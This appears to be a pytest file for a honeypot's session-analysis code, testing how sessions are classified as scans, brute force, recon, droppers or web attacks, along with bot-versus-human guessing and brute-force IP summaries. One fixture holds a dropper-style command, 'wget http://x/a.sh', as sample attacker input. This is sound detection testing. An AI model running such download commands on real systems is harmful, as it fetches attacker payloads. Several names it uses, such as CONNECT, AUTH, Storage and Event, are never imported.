from honeypot.analysis.sessions import (brute_force_ips, classify_session,
                                         guess_actor, summarize)


def e(etype, payload=None, ts="2026-01-01T00:00:00+00:00"):
    # маленький помощник, делает событие-словарь
    return {"event_type": etype, "payload": payload or {}, "ts": ts}


def test_classify():
    assert classify_session([e(CONNECT)]) == "scan"
    assert classify_session([e(AUTH)] * 3) == "bruteforce"
    assert classify_session([e(AUTH)]) == "failed_login"
    assert classify_session([e(COMMAND, {"cmd": "ls"})]) == "recon"
    assert classify_session([e(COMMAND, {"cmd": "wget http://x/a.sh"})]) == "dropper"
    assert classify_session([e(HTTP_REQUEST, {"attacks": ["sqli"]})]) == "web_attack"
    assert classify_session([e(HTTP_REQUEST, {"attacks": []})]) == "web_probe"


def test_guess_actor():
    fast = [e(AUTH, ts=f"2026-01-01T00:00:0{i}+00:00") for i in range(4)]
    slow = [e(COMMAND, ts=f"2026-01-01T00:00:{i * 10:02d}+00:00") for i in range(4)]
    assert guess_actor(fast) == "bot"
    assert guess_actor(slow) == "human"
    assert guess_actor([e(AUTH)]) == "unknown"


def test_brute_force_ips(tmp_path):
    db = Storage(tmp_path / "t.db")
    for i in range(3):
        db.save(Event("ssh", AUTH, "3.3.3.3", session_id=f"s{i}",
                      payload={"success": False}))
    db.save(Event("ssh", AUTH, "4.4.4.4", session_id="x",
                  payload={"success": True}))
    assert brute_force_ips(db) == ["3.3.3.3"]


def test_summarize(tmp_path):
    db = Storage(tmp_path / "t.db")
    db.save(Event("ssh", CONNECT, "1.1.1.1", session_id="a"))
    for _ in range(3):
        db.save(Event("ssh", AUTH, "2.2.2.2", session_id="b"))
    labels, actors = summarize(db)
    assert labels == {"scan": 1, "bruteforce": 1}